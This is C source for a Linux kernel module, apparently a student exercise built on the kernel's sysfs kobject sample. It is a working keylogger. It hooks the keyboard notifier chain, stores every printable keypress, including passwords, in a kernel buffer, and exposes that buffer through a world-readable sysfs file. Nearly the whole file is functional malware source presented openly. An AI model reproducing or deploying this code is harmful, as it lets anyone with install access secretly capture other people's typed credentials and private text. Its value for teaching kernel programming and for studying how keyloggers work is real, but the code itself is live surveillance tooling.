
/*
 * Shelly Revivo 315661884 
 * Tomer Revivo 204470892 
 * Sample key logger implementation 
 * Copyright (C) 2004-2007 Greg Kroah-Hartman <greg@kroah.com>
 * Copyright (C) 2007 Novell Inc.
 * Copyright https://0x00sec.org/t/linux-keylogger-and-notification-chains/4566 -( the key pressed function) 
 */
#include <linux/kobject.h> 
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>
/*
 * This module shows how to create a simple subdirectory in sysfs called
 * /sys/kernel/kobject-example  In that directory, file create : 
 * "foo" ,  the file include all the keys pressed on keyboard,   it can be
 * later read out of it.
 * 
 */


static int foo;


//Keylogger Info
#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys 
static char *keys_bf_ptr = keys_buffer; 
// Our buffer will only be of size 1024. If the user typed more that 1024 valid characters, the keys_buf_ptr would overflow
int buf_pos = 0;  // buf_pos keeps track of the count of characters read to avoid overflows in kernel space

/*******************************************************************************************************************************************/

/*keys_pressed -->  function taken from this website :   https://0x00sec.org/t/linux-keylogger-and-notification-chains/4566*/ 

static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain





/*
 *keys_pressed function : 
 * notifier_block  (nb ) is a struct on linux/notifer.h 
 * this struct has 3 params : 
	* notifier_fn_t notifier_call;--- a pointer to the callback function that will be called once an event happens 
	*struct notifier_block __rcu *next;--- This next variable will point to the next notifier_block. It will be set automatically by the kernel.
	*int priority;---This will indicate the priority of the function. 
	* 
	* We will hold all logged keys in a buffer- keys_buffer . 
We will create a Character Device Driver along with its character device file. Every time the device file is read, the buffer will be printed to the screen and it will be zeroed out.
We will register our LKM(.ko) to the Keyboard Notificaton Chain using a notifier_block. For that we will have to create the callback function that will handle each keypress.
 * */
static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;
	
	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
	if (action == KBD_KEYSYM && param->down) {
		char c = param->value;  // the characrer value on the keyboard . 
		
		// We will only log those key presses that actually represent an ASCII character. 
		if (c == 0x01) {
			*(keys_bf_ptr++) = 0x0a;
			buf_pos++;
		} else if (c >= 0x20 && c < 0x7f) { //letters numbers and symbols on keyboard.
			*(keys_bf_ptr++) = c;
			buf_pos++;
		}
		
		//  buffer overflows in kernel space
		if (buf_pos >= BUFFER_LEN) {
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}	
	return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
}







static struct notifier_block nb = {
	.notifier_call = keys_pressed   //  notifier_call;--- a pointer to the callback function that will be called once an event happens 
};



/*
 * The "foo" file where a static variable is read from and written to.
 * 
 * 
 * we will have to implement show and store
• To access the sysfs attributes (files). -- like in lesson 7 at class 
* 
* 
* show func- 
* Invoked when sysfs entry read from user-space
* • Return size in bytes of data actually written into buffer on success
• negative on failure
• Buffer is PAGE_SIZE in length
* 
* 
 */
static ssize_t foo_show(struct kobject *kobj, struct kobj_attribute *attr,
			char *buf)
{
	return sprintf(buf, "%s\n", keys_buffer);
}


/*
 * store func- 
 * Inovked when sysfs entry written from user-space
 * Return size in bytes of data actually read from buffer on success
• negative error on failure
• Buffer always PAGE_SIZE or smaller
 * 
 * */

static ssize_t foo_store(struct kobject *kobj, struct kobj_attribute *attr,
			 const char *buf, size_t count)
{
	int ret;

	ret = kstrtoint(buf, 10, &foo);
	if (ret < 0)
		return ret;

	return count;
}



/* Sysfs attributes cannot be world-writable. */
/*initialize the struct kobj_attribute*
 * • foo is the name of the file
 * 0664 - the permissions
 * foo_show , foo_store
• Pointers to show and store functions
* 
* 
* */
static struct kobj_attribute foo_attribute =
	__ATTR(foo, 0664, foo_show, foo_store);



/*
 * Create a group of attributes so that we can create and destroy them all
 * at once.
 */
static struct attribute *attrs[] = {
	&foo_attribute.attr,
	NULL,	/* need to NULL terminate the list of attributes */
};

/*
 * An unnamed attribute group will put all of the attributes directly in
 * the kobject directory.  If we specify a name, a subdirectory will be
 * created for the attributes with the directory being the name of the
 * attribute group.
 */
static struct attribute_group attr_group = {
	.attrs = attrs,
};


static struct kobject *example_kobj;

static int __init example_init(void)
{
	int retval;
	
	register_keyboard_notifier(&nb);
	memset(keys_buffer, 0, BUFFER_LEN);
	/*
	 * Create a simple kobject with the name of "kobject_example",
	 * located under /sys/kernel/
	 *
	 * As this is a simple directory, no uevent will be sent to
	 * userspace.  That is why this function should not be used for
	 * any type of dynamic kobjects, where the name and number are
	 * not known ahead of time.
	 */
	example_kobj = kobject_create_and_add("kobject_example", kernel_kobj);
	if (!example_kobj)
		return -ENOMEM;

	/* Create the files associated with this kobject */
	retval = sysfs_create_group(example_kobj, &attr_group);
	if (retval)
		kobject_put(example_kobj);
	
	return retval;
}

static void __exit example_exit(void)
{
	unregister_keyboard_notifier(&nb);
	kobject_put(example_kobj);
}

module_init(example_init);
module_exit(example_exit);
MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Shelly and Tomer Revivo");
